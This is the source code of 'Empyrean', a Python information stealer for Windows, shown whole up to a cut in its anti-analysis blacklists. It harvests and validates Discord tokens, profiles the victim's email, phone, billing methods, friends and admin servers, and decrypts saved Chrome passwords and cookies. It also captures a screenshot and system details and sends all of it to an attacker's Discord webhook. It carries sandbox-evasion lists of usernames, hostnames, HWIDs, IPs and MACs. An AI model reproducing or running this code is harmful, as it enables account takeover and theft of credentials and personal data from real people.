import base64
import json
import os
import platform
import re
import shutil
import socket
import sqlite3
import subprocess
import uuid

import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from PIL import ImageGrab
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

# Config

webhook = "WEBHOOK_URL"

# Config 

def main(webhook: str) -> None: 
    debug()
    cleanup()
    startup()
    
    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Empyrean", color=0x000000)
    
    token_grabber(embed=embed)
    embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
    
    google().grabPassword()
    google().grabCookies()
    image()
    
    files = []
    files.append(File(".\\chrome-passwords.txt") if os.path.exists(".\\chrome-passwords.txt") else None)
    files.append(File(".\\chrome-cookies.txt") if os.path.exists(".\\chrome-cookies.txt") else None)
    files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
    
    webhook.send(embed=embed, files=files if files != [] else None, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
    cleanup()
    
class token_grabber():
    def __init__(self, embed) -> None:
        global tokens
        
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []
        self.ids = []
        
        self.grabTokens()
        self.embed_accounts(embed)
    
    def embed_accounts(self, embed) -> None:
        for token in self.tokens:
            r = requests.get("https://discordapp.com/api/v6/users/@me", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })

            username = r.json()['username'] + '#' + r.json()['discriminator']
            user_id = r.json()['id']
            email = r.json()['email']
            phone = r.json()['phone']
            
            emoji_staff = "<:staff:968704541946167357>"
            emoji_partner = "<:partner:968704542021652560>"
            emoji_hypesquad_event = "<:hypersquad_events:968704541774192693>"
            emoji_green_bughunter = "<:bug_hunter_1:968704541677723648>"
            emoji_hypesquad_bravery = "<:hypersquad_1:968704541501571133>"
            emoji_hypesquad_brilliance = "<:hypersquad_2:968704541883261018>"
            emoji_hypesquad_balance = "<:hypersquad_3:968704541874860082>"
            emoji_early_supporter = "<:early_supporter:968704542126510090>"
            emoji_gold_bughunter = "<:bug_hunter_2:968704541774217246>"
            emoji_verified_bot_developer = "<:verified_dev:968704541702905886>"  
   
            badges = ""
            flags = r.json()['public_flags']
            if (flags == 1): badges += f"{emoji_staff}, "
            if (flags == 2): badges += f"{emoji_partner}, "
            if (flags == 4): badges += f"{emoji_hypesquad_event}, "
            if (flags == 8): badges += f"{emoji_green_bughunter}, "
            if (flags == 64): badges += f"{emoji_hypesquad_bravery}, "
            if (flags == 128): badges += f"{emoji_hypesquad_brilliance}, "
            if (flags == 256): badges += f"{emoji_hypesquad_balance}, "
            if (flags == 512): badges += f"{emoji_early_supporter}, "
            if (flags == 16384): badges += f"{emoji_gold_bughunter}, "
            if (flags == 131072): badges += f"{emoji_verified_bot_developer}, "
            if (badges == ""): badges = "`None`"
            if badges.endswith(", "): badges = badges[:-2]   

            try:
                if r.json()['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r.json()['premium_type'] == 2:
                    nitro = 'Nitro Boost'
            except KeyError:
                nitro = 'None'

            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
            
            if b.json() == []:
                methods = "`None`"
            else:
                methods = ""
                for method in b.json():
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 0:
                        methods += "<:paypal:973417655627288666>"
                    else:
                        methods += "❓"

            f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
   
            hq_friends = ""
            for friend in f.json():
                prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
                if friend['user']['public_flags'] in prefered_flags:
                    hq_badges = ""
                    flags = friend['user']['public_flags']
                    if (flags == 1): hq_badges += f"{emoji_staff}, "
                    if (flags == 2): hq_badges += f"{emoji_partner}, "
                    if (flags == 4): hq_badges += f"{emoji_hypesquad_event}, "
                    if (flags == 8): hq_badges += f"{emoji_green_bughunter}, "
                    if (flags == 512): hq_badges += f"{emoji_early_supporter}, "
                    if (flags == 16384): hq_badges += f"{emoji_gold_bughunter}, "
                    if (flags == 131072): hq_badges += f"{emoji_verified_bot_developer}, "
                    if hq_badges.endswith(", "): hq_badges = hq_badges[:-2]
     
                    hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"

            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
            
            hq_guilds = ""
            for guild in g.json():
                admin = True if guild['permissions'] == '4398046511103' else False
                if admin and guild['approximate_member_count'] >= 50:
                    i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Authorization': token,
                    })
                    
                    invite = i.json()[0]['code']
                    if guild['owner']:
                        owner = " ✅ "
                    else:
                        owner = "❌"
                        
                    hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{invite})\n"
                
                
            
            embed.add_field(name=f"**{username} ({user_id})**", value=f"```{token}```\n***Email >*** `{email}`\n***Phone >*** `{phone}`\n***Nitro >*** `{nitro}`\n***Billing >*** {methods}\n***Badges >*** {badges}\n\u200b", inline=False)
            
            if hq_friends != "":
                embed.add_field(name="***HQ Friends >***", value=f"{hq_friends}\n\u200b", inline=False)
                
            if hq_guilds != "":
                embed.add_field(name="***HQ Guilds >***", value=f"{hq_guilds}\n\u200b", inline=False)
       
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token,
                                    })
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
  
class google():
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        if os.path.exists('.\\chrome-passwords.txt'):
            os.remove('.\\chrome-passwords.txt')
        
        with open('.\\chrome-passwords.txt', 'w') as f:
            f.write('Empyrean /// Google Chrome Passwords\n\n\n')
            hide('chrome-passwords.txt')
            
        appdata = os.getenv("localappdata")
  
        if not os.path.exists(appdata+'\\Google'):
            return []
  
        passwords = []
        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
        
        login_dbs = [
            appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
        ]      
            
        used_login_dbs = []
        
        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            
            used_login_dbs.append(login_db)
            
            try:
                shutil.copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                with open('.\\chrome-passwords.txt', 'a') as f:
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_password(encrypted_password, master_key)
                        if url != "" and username != "" and decrypted_password != "":
                            f.write(f'URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n')
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass
        
        return passwords

    def grabCookies(self):
        if os.path.exists('.\\chrome-cookies.txt'):
            os.remove('.\\chrome-cookies.txt')
        
        with open('.\\chrome-cookies.txt', 'w') as f:
            f.write('Empyrean /// Google Chrome cookies\n\n\n')
            hide('chrome-cookies.txt')
            
        appdata = os.getenv("localappdata")
  
        if not os.path.exists(appdata+'\\Google'):
            return []

        cookies = []
        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
        
        login_dbs = [
            appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
        ] 
        
        used_login_dbs = []
        
        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            
            used_login_dbs.append(login_db)
            
            try:
                shutil.copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                with open('.\\chrome-cookies.txt', 'a') as f:
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.decrypt_password(r[2], master_key)
                        if host != "":
                            f.write(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
        
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass	

        return cookies

class systemspec():
	def sys_spec():
		sys_spec = f"""
Operating System: {systemspec.platform_info()[0]}
Release: {systemspec.platform_info()[1]}
Version: {systemspec.platform_info()[2]}
Architecture: {systemspec.platform_info()[3]}
Hostname: {systemspec.platform_info()[4]}

IP Address: {systemspec.network_info()[0]}
Mac Address: {systemspec.network_info()[1]}

CPU: {systemspec.system_specs()[0].Name}
GPU: {systemspec.system_specs()[1].Name}
RAM: {round(systemspec.system_specs()[2], 0)} GB
"""
		return sys_spec

	def platform_info():
		operating_sys = platform.system()
		os_release = platform.release()
		os_version = platform.version()
		architecture = platform.architecture()
		hostname = socket.gethostname()
		
		return operating_sys, os_release, os_version, architecture, hostname
	
	def network_info():
		ip_address = requests.get('https://api.ipify.org').text
		mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

		return ip_address, mac_address
	
	def system_specs():
		cpu = wmi.WMI().Win32_Processor()[0]
		gpu = wmi.WMI().Win32_VideoController()[0]
		ram = float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576
		
		return cpu, gpu, ram

def image():
    os.remove('.\\screenshot.png') if os.path.exists('.\\screenshot.png') else None
    ImageGrab.grab().save('.\\screenshot.png', 'PNG')
    hide('screenshot.png')
    
def hide(file):
    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)

def cleanup():
    possible_files = [
        '.\\chrome-passwords.txt',
        '.\\chrome-cookies.txt',
        '.\\screenshot.png'
    ]
    for file in possible_files:
        if os.path.exists(file):
            os.remove(file)

class debug:
    def __init__(self):
        if self.checks(): self.self_destruct()
    
    def checks(self):
        debugging = False 
        
        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', 